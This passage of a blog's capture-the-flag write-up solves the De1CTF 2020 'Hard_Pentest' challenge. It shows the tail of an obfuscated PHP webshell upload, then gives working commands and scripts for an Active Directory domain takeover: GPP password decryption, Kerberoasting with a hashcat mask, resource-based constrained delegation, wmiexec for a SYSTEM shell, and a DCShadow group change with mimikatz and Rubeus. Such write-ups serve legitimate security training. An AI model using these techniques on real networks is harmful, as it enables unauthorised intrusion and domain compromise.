class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$_=$$____?&gt;</span><br><span class="line">&lt;?=$___($_[_])?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">Content-Disposition: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD--</span><br></pre></td></tr></tbody></table></figure>
<p>After getting the webshell, it is found that the flag is not on the web server. It is guessed that it should be internal penetration. For convenience, you can reverse a meterpreter or beacon back. Then the next step is internal penetration. Collect simple information and find that the domain controllor shared folder Hint has a compressed package <code>flag1_and_flag2hint.zip</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/1.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Download it, find that the compressed package requires a password, continue to collect information, and find a user <code>HintZip_Pass</code>, guessing that the compressed password should start from this user.</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/2.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Then collect some information of the <code>Zip_Password</code> user and find that this user belongs to the OU of<code>Zip_Password</code>, not the regular Users container</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/3.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Found that this OU has a <code>gplink</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/4.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Then collect information on this GPO</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/6.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Then use <code>Get-GPPPassword.ps1</code> to get the compressed package password</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/5.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>or write a script to decrypt <code>cpassword</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">key = <span class="string">"4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">cpassword = <span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span></span><br><span class="line">cpassword += <span class="string">"="</span> * ((<span class="number">4</span> - len(cpassword) % <span class="number">4</span>) % <span class="number">4</span>)</span><br><span class="line">password = b64decode(cpassword)</span><br><span class="line">plain = AES.new(key, AES.MODE_CBC, <span class="string">"\x00"</span> * <span class="number">16</span>)</span><br><span class="line">plain = plain.decrypt(password)</span><br><span class="line"><span class="keyword">print</span> plain[:-ord(plain[<span class="number">-1</span>])].decode(<span class="string">'utf16'</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>After decompression, you can get flag1 and some hints of flag2</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag1: De1CTF{GpP_11Is_SoOOO_Ea3333y}</span><br><span class="line"></span><br><span class="line">Get flag2 Hint:</span><br><span class="line">hint1: You need De1ta user to get flag2</span><br><span class="line">hint2: De1ta user's password length is 1-8, and the password is composed of [0-9a-f].</span><br><span class="line">hint3: Pay attention to the extended rights of De1ta user on the domain.</span><br><span class="line">hint4: flag2 in Domain Controller (C:\Users\Administrator\Desktop\flag.txt)</span><br><span class="line"></span><br><span class="line">PS: Please do not damage the environment after getting permission, thanks QAQ.</span><br></pre></td></tr></tbody></table></figure>
<p>According to Hint, you need user De1ta to get flag2, and then collect information for De1ta users, and find that web users have write permission for De1ta user’s servicePrincipalName attribute.</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/8.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>According to Hint2, the guess should be to set up a spn for De1ta through a web user and then use Kerberoasting to brute force the password of the De1ta user.</p>
<p>set up spn for De1ta users</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/9.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>then <code>Kerberoasting</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/10.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Then use hashcat offline brute force according to Hint2 to get the password of De1ta user</p>
<p>PSï¼šYou can also use the LDAP protocol to brute force online, but the password length is <code>16^1 + 16^2 + 16^3 + 16^4 + 16^5 + 16^6 + 16^7 + 16^8 = 4581298448</code>, It is clear that online brute force cracking is unrealistic.</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13100 $krb5tgs$23$*USER$DOMAIN$test/test*$64EC0B10760E27F6EF4811DA3478C56D$77696AF42F593CF24D6B62D3DFEEF4AF8451E912AEC808B81BB2A833059EF7B0E9B41695D572B73917814E2439581239D264F4EF8ED6FC4DBC8DF5EA7D1F5CAD0B3197BFC16798C8EF2546B6DE4504D0F1C007EEA3222E948A448D818BDC8E4C26BBE2FD5D321BB0E2B0C6985383D9BA2E83E6389B4043E6CD04F2715C3159B7374DB32B817B4B3B04537CFDACD6FF54911F076EED74F820AF85D17FF93081775828E70DCD4489819EB6C6D518CF0C10F498B9A96EAA9CA330E8CE81C02D795572991D8979E39A6C633E849FCBC2831943F067320E41BF4FB0A9B8EB2EEC4CDD91606BDA4DF32A8BB4869D2CD424D9A156943D20E91F08C6EFA65B7C7AFC41309BCDA965E95D81318E47044D9333012914BBF27B1A48FC55BF8494DD65F317CAFA22F42F290335161ACE544841C196EBC239EE99A7F31C215119421390FAD8F16AAC63A7F83066B4CC5FB6AB89C61691E9202B447A4E920AF42A641133753AD5CF51580FBBAE080EBBAF589A1DF1E9543288A18116A0E191261149E63B88874BA607B3E4517EF84F3BA9B18255B58B3FF2C8570DCABC12F4FC0DA49AE61A92E8AF3C0ECD746BFF591743EFBC438E15CC645ECA3BFD935649168367287DD4E8029FC4454FAE237E8048FA701F8901EC9B4B5372E6B85802AB8A26F233D583F79F49CBAC378838E3C05AB2C2065C35A6C5D8B0B92D7F438E80BF3A1D847DC174BB0D370EB09125D710243001A9D988E350B43D556AEE8F09053790AAAFC395292EE2FAD3B7A04EB330AB90D2EAE29D9D922F0BB65ED2FF05A9A73B09001F5AECE1BC7162DE480F5463C7B19932B50DFA0329CDF0F964EFC0647FB7319408B541587D6AF2730EC52243E7A7BAB096AFB1FA6E7A81A7148347B43394BC3E280062105C1A6859F278C829E3BBAC3FD4F545154657BC4E0F55AF439140B3B1D29EE4209B8F83E3E3DDC52A6C32E92EB2836F80AF972B54D029D8EC071BD12BDCA45DBDF555A64B16AEC90CC486159D07D53A9D9196E5A736F48350F5639F482B45E7BA3EC11A9B7CA4DD8BC6320058CA0D891F5B4B1BFE0243E8D9640380492B0BEFB9EC13B8A4B2DE4297C3DE84FDB2753693F5E9FFB46FC1F60748AF1A07DE60F7656DBEDB927E3DF35B1AE8588BA6450C8D7539F982385D1B8AC25B37638EF9414519F37773A353EBBAAF996DF17DDE3CBF64B9ACFBEF65E12773004BDF5B6B81CC8CF5D2B59C6A2AAA883B458676AD2800710FA3F017C2E53B353D4E2C6B0D92D57B79939D29FAA8049F6CF0782E2572ACE8E8FFDFE1A05AC277924D4826606F5C68369C15186910DAEC601CA691910DCE519D58EDC964D5844FE8B7B21F9F99C6891FAE7DC0D783EA78EF6393A92F273D98353718670BA167A9CC9809B03195EDA8323B7C887040CD37FF4A09 -1 0123456789abcdef --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1</span><br></pre></td></tr></tbody></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/11.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>According to Hint3ï¼šPay attention to the extended rights of De1ta user on the domain.Then collect information on the domain ACL</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/12.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>It is found that De1ta users have the permissions of <code>Add/Remove Replica In Domain</code>,<code>Replication Synchronization</code>, and <code>Manage Replication Topology</code> on the domain. This is easy to think of Dcshadow, but the three permissions alone do not meet the conditions of Dcshadow. Then collect the related ACLS</p>
<p>Found that De1ta users have <code>Create Child</code> and<code>Delete Chind</code> permissions on <code>CN = Sites, CN = Configuration, DC = De1CTF2020, DC = lab</code> containers</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/13.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>De1ta has write permission for DM attributes, which just meets all the permissions of Dcshadow.</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/14.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>But there is still a problem now that Dcshadow needs system permission to call the local RPC service. As mentioned above, De1ta has write permission to the DM attribute. Through information collection, you can know that the domain controller is <code>Windows Server 2012R2</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/38.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Therefore, we get high-privilege through resource-based constrained delegation.</p>
<p>Request a TGT of de1ta user and import the current session.</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/27.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Then create a new computer user, evilsystem, and configure the resource-based constraint delegation from evilsystem to DM</p>
<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount evilsystem -Password $(<span class="built_in">ConvertTo-SecureString</span> <span class="string">"evil"</span> -AsPlainText -Force)</span><br><span class="line"></span><br><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1806179181-549835139-1294087714-1111)"</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line">Get-DomainComputer DM| Set-DomainObject -Set @{<span class="string">'msds-allowedtoactonbehalfofotheridentity'</span>=<span class="variable">$SDBytes</span>} -Verbose</span><br></pre></td></tr></tbody></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/28.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>After the configuration is complete, we can get a high privileged shell through s4u.</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getst.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/evilsystem:evil</span><br><span class="line">set KRB5CCNAME="Administrator.ccache"</span><br><span class="line">wmiexec.exe -no-pass -k dm shell.exe</span><br></pre></td></tr></tbody></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/30.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>After execution, you can get a high-privileged shell</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/31.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Then use Dcshadow to modify the user’s attributes. Here, you can change the SID-History to the domain admin SID or modify the PrimaryGroupID to the domain admins group’s primaryGroupID (512).</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe  "!+" "!processtoken" "lsadump::dcshadow /object:de1ta /attribute:primaryGroupID /value:512"</span><br></pre></td></tr></tbody></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/32.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>Then use user De1ta to push, triggering data synchronization between domain controllers</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /domain:de1ctf2020.lab /ptt &amp;&amp; mimikatz.exe "lsadump::dcshadow /push" "exit"</span><br></pre></td></tr></tbody></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/36.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>After pushing, check whether De1ta joins the domain admins group</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/35.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>then read the flag on the domain controller</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/37.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>The whole process is as follows:</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="./img/9.gif" alt="gif" title="">
                </div>
                <div class="image-caption">gif</div>
            </figure>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>
        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2020-06-06T02:04:04.457Z" itemprop="dateUpdated">2020-06-06 10:04:04</time>
</span><br>


        
        know it then hack it
        
    </div>
    
    <footer>
        <a href="https://byqiyou.github.io">
            <img src="/img/avatar.jpg" alt="">
            
        </a>
    </footer>
</blockquote>

        
<div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>



        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest/">pentest</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2020/05/06/De1CTF2020-en/&title=《Hard_Pentest && Easy protocol题解》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2020/05/06/De1CTF2020-en/&title=《Hard_Pentest && Easy protocol题解》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2020/05/06/De1CTF2020-en/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Hard_Pentest && Easy protocol题解》 — 七友&url=https://byqiyou.github.io/2020/05/06/De1CTF2020-en/&via=https://byqiyou.github.io" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2020/05/06/De1CTF2020-en/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2020/05/06/De1CTF2020/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Hard_Pentest &amp;&amp; Easy protocol题解</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2020/03/23/域渗透——基于资源的约束委派利用/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">域渗透——基于资源的约束委派利用</h4>
      </a>
    </div>
  
</nav>



    


<section class="comments" id="comments">
    <div id="disqus_thread"></div>
    <script>
    var disqus_shortname = 'true';
    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</section>




<section class="comments" id="comments">
    <!-- UY BEGIN -->
    <div id="uyan_frame"></div>
    <script src="http://v2.uyan.cc/code/uyan.js?uid=true"></script>
    <!-- UY END -->
</section>
















</article>

<div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        Thinks
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/2.png" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/2.png" data-alipay="/img/alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span> &copy; 2018 - 2020</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2020/05/06/De1CTF2020-en/&title=《Hard_Pentest && Easy protocol题解》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2020/05/06/De1CTF2020-en/&title=《Hard_Pentest && Easy protocol题解》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2020/05/06/De1CTF2020-en/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Hard_Pentest && Easy protocol题解》 — 七友&url=https://byqiyou.github.io/2020/05/06/De1CTF2020-en/&via=https://byqiyou.github.io" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2020/05/06/De1CTF2020-en/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://byqiyou.github.io/2020/05/06/De1CTF2020-en/" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: true };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = 'Leave';
            clearTimeout(titleTime);
        } else {
            document.title = 'Come back';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
